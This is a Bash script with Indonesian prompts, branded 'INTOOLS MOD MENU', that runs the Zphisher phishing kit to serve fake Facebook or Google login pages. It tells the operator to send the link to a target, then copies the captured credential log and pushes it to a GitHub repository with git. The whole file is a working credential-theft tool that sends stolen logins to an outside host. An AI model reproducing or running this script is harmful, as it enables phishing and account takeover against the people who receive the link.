#!/bin/bash

# Warna
R='\033[0;31m'
G='\033[0;32m'
Y='\033[1;33m'
C='\033[0;36m'
NC='\033[0m'

# Header
clear
echo -e "${C}"
echo "╔══════════════════════════════╗"
echo "║       INTOOLS MOD MENU      ║"
echo "╚══════════════════════════════╝"
echo -e "${NC}"

# Menu Utama
echo -e "${Y}[1] Login Account (FB / Google)"
echo -e "[0] Exit${NC}"
read -p "Pilih menu: " menu

if [[ $menu == "1" ]]; then
    clear
    echo -e "${Y}[1] Login Facebook"
    echo -e "[2] Login Google${NC}"
    read -p "Pilih jenis login: " pilihan

    if [[ $pilihan == "1" ]]; then
        echo -e "${G}Menjalankan Zphisher - Facebook...${NC}"
        echo 1 | zphisher &

    elif [[ $pilihan == "2" ]]; then
        echo -e "${G}Menjalankan Zphisher - Google...${NC}"
        echo 2 | zphisher &
    
    else
        echo -e "${R}Pilihan tidak valid.${NC}"
        exit
    fi

    sleep 10
    read -p "Kirim link ke target dan tekan Enter setelah login dilakukan..."

    # Deteksi hasil
    LOGFILE="$HOME/.zphisher/sites/facebook/log.txt"
    [[ $pilihan == "2" ]] && LOGFILE="$HOME/.zphisher/sites/google/log.txt"

    if [[ -f "$LOGFILE" ]]; then
        echo -e "${G}Login ditemukan, menyimpan hasil...${NC}"
        mkdir -p .data
        cp "$LOGFILE" ".data/hasil.txt"

        cd "$HOME/INTOOLS"
        cp "$HOME/.data/hasil.txt" .

        git add hasil.txt
        git commit -m "Update hasil login"
        git push origin main

        echo -e "${C}Hasil login dikirim ke GitHub.${NC}"
    else
        echo -e "${R}Belum ada hasil login ditemukan.${NC}"
    fi

elif [[ $menu == "0" ]]; then
    echo -e "${Y}Keluar...${NC}"
    exit
else
    echo -e "${R}Pilihan tidak valid.${NC}"
    exit
fi
